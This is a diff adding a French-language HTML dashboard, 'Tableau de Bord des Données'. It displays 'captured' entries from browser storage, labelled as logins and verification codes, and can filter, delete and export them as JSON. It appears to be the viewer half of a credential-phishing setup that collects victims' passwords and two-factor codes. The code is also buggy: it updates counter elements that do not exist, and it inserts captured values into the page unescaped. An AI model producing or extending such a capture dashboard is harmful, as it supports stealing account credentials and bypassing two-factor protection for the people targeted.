@@ -1,0 +1,455 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>📊 Données Capturées</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .header {
+            background: white;
+            padding: 20px 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+        h1 {
+            color: #333;
+            font-size: 28px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .controls {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+        .btn {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .btn-refresh {
+            background: #4285f4;
+            color: white;
+        }
+        .btn-refresh:hover {
+            background: #357ae8;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(66, 133, 244, 0.3);
+        }
+        .btn-clear {
+            background: #ea4335;
+            color: white;
+        }
+        .btn-clear:hover {
+            background: #d33828;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(234, 67, 53, 0.3);
+        }
+        .btn-export {
+            background: #34a853;
+            color: white;
+        }
+        .btn-export:hover {
+            background: #2d8e47;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(52, 168, 83, 0.3);
+        }
+        .stats {
+            background: white;
+            padding: 20px 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+            margin-bottom: 20px;
+            display: flex;
+            gap: 30px;
+            flex-wrap: wrap;
+        }
+        .stat-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .stat-icon {
+            font-size: 32px;
+        }
+        .stat-info h3 {
+            font-size: 14px;
+            color: #666;
+            font-weight: 500;
+        }
+        .stat-info p {
+            font-size: 24px;
+            color: #333;
+            font-weight: 700;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+            min-height: 400px;
+        }
+        .empty-state {
+            text-align: center;
+            padding: 60px 20px;
+            color: #999;
+        }
+        .empty-state-icon {
+            font-size: 64px;
+            margin-bottom: 20px;
+        }
+        .empty-state h2 {
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        .empty-state p {
+            font-size: 16px;
+        }
+        .donnee-item {
+            background: #f9f9f9;
+            padding: 20px;
+            margin: 15px 0;
+            border-left: 5px solid #4285f4;
+            border-radius: 8px;
+            transition: all 0.3s;
+            position: relative;
+        }
+        .donnee-item:hover {
+            transform: translateX(5px);
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
+        .donnee-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        .donnee-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: #333;
+        }
+        .donnee-type {
+            display: inline-block;
+            padding: 5px 12px;
+            background: #4285f4;
+            color: white;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+        .donnee-type.login {
+            background: #ea4335;
+        }
+        .donnee-type.verification {
+            background: #34a853;
+        }
+        .timestamp {
+            color: #666;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        .donnee-content {
+            background: white;
+            padding: 15px;
+            border-radius: 5px;
+            margin-top: 10px;
+        }
+        .donnee-field {
+            display: flex;
+            padding: 8px 0;
+            border-bottom: 1px solid #eee;
+        }
+        .donnee-field:last-child {
+            border-bottom: none;
+        }
+        .field-label {
+            font-weight: 600;
+            color: #555;
+            min-width: 120px;
+        }
+        .field-value {
+            color: #333;
+            word-break: break-all;
+        }
+        .btn-delete {
+            background: #ea4335;
+            color: white;
+            border: none;
+            padding: 5px 15px;
+            border-radius: 5px;
+            font-size: 12px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .btn-delete:hover {
+            background: #d33828;
+        }
+        .filter-container {
+            margin-bottom: 20px;
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+        .filter-btn {
+            padding: 8px 16px;
+            border: 2px solid #4285f4;
+            background: white;
+            color: #4285f4;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .filter-btn.active {
+            background: #4285f4;
+            color: white;
+        }
+        .filter-btn:hover {
+            background: #4285f4;
+            color: white;
+        }
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        .donnee-item {
+            animation: fadeIn 0.3s ease-in;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>📊 Tableau de Bord des Données</h1>
+        <div class="controls">
+            <button class="btn btn-refresh" onclick="chargerDonnees()">
+                🔄 Actualiser
+            </button>
+            <button class="btn btn-export" onclick="exporterDonnees()">
+                💾 Exporter JSON
+            </button>
+            <button class="btn btn-clear" onclick="effacerTout()">
+                🗑️ Tout effacer
+            </button>
+        </div>
+    </div>
+
+    <div class="stats">
+        <div class="stat-item">
+            <div class="stat-icon">🕐</div>
+            <div class="stat-info">
+                <h3>Dernière mise à jour</h3>
+                <p id="stat-time">--:--</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="filter-container">
+            <button class="filter-btn active" data-filter="all" onclick="filtrer('all')">
+                Tous
+            </button>
+            <button class="filter-btn" data-filter="login" onclick="filtrer('login')">
+                Connexions
+            </button>
+            <button class="filter-btn" data-filter="verification_code" onclick="filtrer('verification_code')">
+                Vérifications
+            </button>
+        </div>
+        <div id="donnees-container">
+            <div class="empty-state">
+                <div class="empty-state-icon">📭</div>
+                <h2>Aucune donnée</h2>
+                <p>Les données capturées apparaîtront ici automatiquement.</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let donnees = [];
+        let filtreActif = 'all';
+
+        function chargerDonnees() {
+            // Récupérer les données du localStorage
+            const dataStr = localStorage.getItem('captured_data');
+            
+            if (dataStr) {
+                donnees = JSON.parse(dataStr);
+            } else {
+                donnees = [];
+            }
+            
+            afficherDonnees();
+            mettreAJourStats();
+        }
+
+        function afficherDonnees() {
+            const container = document.getElementById('donnees-container');
+            
+            let donneesAffichees = donnees;
+            if (filtreActif !== 'all') {
+                donneesAffichees = donnees.filter(d => d.type === filtreActif);
+            }
+            
+            if (donneesAffichees.length === 0) {
+                container.innerHTML = `
+                    <div class="empty-state">
+                        <div class="empty-state-icon">📭</div>
+                        <h2>Aucune donnée</h2>
+                        <p>${filtreActif === 'all' ? 'Les données capturées apparaîtront ici automatiquement.' : 'Aucune donnée de ce type.'}</p>
+                    </div>
+                `;
+                return;
+            }
+            
+            container.innerHTML = donneesAffichees.map((item, realIndex) => {
+                const typeClass = item.type === 'login' ? 'login' : 'verification';
+                const typeLabel = item.type === 'login' ? 'Connexion' : 'Vérification';
+                const itemIndex = donnees.indexOf(item);
+                
+                let fieldsHTML = '';
+                for (let [key, value] of Object.entries(item)) {
+                    if (key !== 'type' && key !== 'timestamp' && key !== 'id') {
+                        fieldsHTML += `
+                            <div class="donnee-field">
+                                <div class="field-label">${key}:</div>
+                                <div class="field-value">${value}</div>
+                            </div>
+                        `;
+                    }
+                }
+                
+                return `
+                    <div class="donnee-item">
+                        <div class="donnee-header">
+                            <div>
+                                <div class="donnee-title">Entrée #${itemIndex + 1}</div>
+                                <span class="donnee-type ${typeClass}">${typeLabel}</span>
+                            </div>
+                            <button class="btn-delete" onclick="supprimerDonnee(${itemIndex})">
+                                🗑️ Supprimer
+                            </button>
+                        </div>
+                        <div class="timestamp">
+                            🕐 ${item.timestamp || 'Date non disponible'}
+                        </div>
+                        <div class="donnee-content">
+                            ${fieldsHTML}
+                        </div>
+                    </div>
+                `;
+            }).reverse().join('');
+        }
+
+        function mettreAJourStats() {
+            const total = donnees.length;
+            const logins = donnees.filter(d => d.type === 'login').length;
+            const verifications = donnees.filter(d => d.type === 'verification_code').length;
+            const now = new Date();
+            const time = now.toLocaleTimeString('fr-FR');
+            
+            document.getElementById('stat-total').textContent = total;
+            document.getElementById('stat-login').textContent = logins;
+            document.getElementById('stat-verification').textContent = verifications;
+            document.getElementById('stat-time').textContent = time;
+        }
+
+        function filtrer(type) {
+            filtreActif = type;
+            
+            // Mettre à jour les boutons
+            document.querySelectorAll('.filter-btn').forEach(btn => {
+                btn.classList.remove('active');
+            });
+            document.querySelector(`[data-filter="${type}"]`).classList.add('active');
+            
+            afficherDonnees();
+        }
+
+        function supprimerDonnee(index) {
+            if (confirm('Êtes-vous sûr de vouloir supprimer cette donnée ?')) {
+                donnees.splice(index, 1);
+                localStorage.setItem('captured_data', JSON.stringify(donnees));
+                chargerDonnees();
+            }
+        }
+
+        function effacerTout() {
+            if (confirm('⚠️ ATTENTION : Êtes-vous sûr de vouloir effacer TOUTES les données ?\n\nCette action est irréversible !')) {
+                localStorage.removeItem('captured_data');
+                donnees = [];
+                chargerDonnees();
+            }
+        }
+
+        function exporterDonnees() {
+            if (donnees.length === 0) {
+                alert('Aucune donnée à exporter !');
+                return;
+            }
+            
+            const dataStr = JSON.stringify(donnees, null, 2);
+            const dataBlob = new Blob([dataStr], {type: 'application/json'});
+            const url = URL.createObjectURL(dataBlob);
+            const link = document.createElement('a');
+            link.href = url;
+            link.download = `donnees_captured_${new Date().getTime()}.json`;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            URL.revokeObjectURL(url);
+            
+            alert('✅ Données exportées avec succès !');
+        }
+
+        // Charger les données au démarrage
+        chargerDonnees();
+
+        // Actualiser automatiquement toutes les 2 secondes
+        setInterval(chargerDonnees, 2000);
+
+        // Écouter les changements dans le localStorage (multi-onglets)
+        window.addEventListener('storage', function(e) {
+            if (e.key === 'captured_data') {
+                chargerDonnees();
+            }
+        });
+    </script>
+</body>
+</html>
